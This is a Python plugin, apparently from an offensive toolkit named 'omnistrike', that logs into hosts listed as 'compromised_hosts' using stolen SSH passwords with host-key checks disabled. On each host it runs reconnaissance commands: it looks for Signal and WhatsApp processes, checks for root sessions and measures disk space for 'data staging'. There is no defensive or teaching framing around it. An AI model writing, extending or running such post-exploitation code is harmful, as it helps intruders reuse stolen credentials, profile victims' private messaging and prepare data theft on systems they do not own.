import asyncio
import asyncssh
from omnistrike.plugins.base import BasePlugin

class ContextTriggerPlugin(BasePlugin):
    def __init__(self):
        # Configuration for contextual triggers
        self.rules = [
            {"trigger": "pgrep -f 'signal-desktop|whatsapp'", "action": "Audit messaging app context", "module": "SecureMessagingAuditor"},
            {"trigger": "who | grep 'root'", "action": "Trigger high-privilege session audit", "module": "SystemAuditor"},
            {"trigger": "df -h / | awk 'NR==2 {print $5}' | sed 's/%//'", "threshold": 80, "action": "Alert: Low disk space for data staging", "module": "Alert"}
        ]

    @property
    def name(self):
        return "ContextTrigger"

    @property
    def description(self):
        return "Autonomous intelligence engine that triggers operations based on real-time system context."

    async def run_rule(self, conn, rule):
        try:
            result = await conn.run(rule['trigger'])
            if result.stdout:
                if 'threshold' in rule:
                    try:
                        val = int(result.stdout.strip())
                        if val > rule['threshold']:
                            return {"rule": rule['action'], "status": "TRIGGERED", "value": val}
                    except:
                        pass
                else:
                    return {"rule": rule['action'], "status": "TRIGGERED", "output": result.stdout[:100].strip()}
        except:
            pass
        return None

    async def run(self, target, data):
        compromised_hosts = data.get('compromised_hosts', {})
        if not compromised_hosts:
            return

        print(f"[*] Initializing ContextTrigger autonomous engine on {len(compromised_hosts)} host(s)...")
        trigger_results = {}

        for ip, creds in compromised_hosts.items():
            for cred in creds:
                if cred['service'] == 'ssh':
                    print(f"[*] Monitoring context for {ip}...")
                    triggered_actions = []
                    try:
                        async with asyncssh.connect(ip, username=cred['username'], password=cred['password'], known_hosts=None) as conn:
                            for rule in self.rules:
                                res = await self.run_rule(conn, rule)
                                if res:
                                    triggered_actions.append(res)

                        if triggered_actions:
                            trigger_results[ip] = triggered_actions
                            print(f"[!] Autonomous trigger activated for {ip}: {len(triggered_actions)} rules met.")
                        break
                    except Exception as e:
                        print(f"[!] ContextTrigger failed on {ip}: {e}")

        data['triggered_operations'] = trigger_results
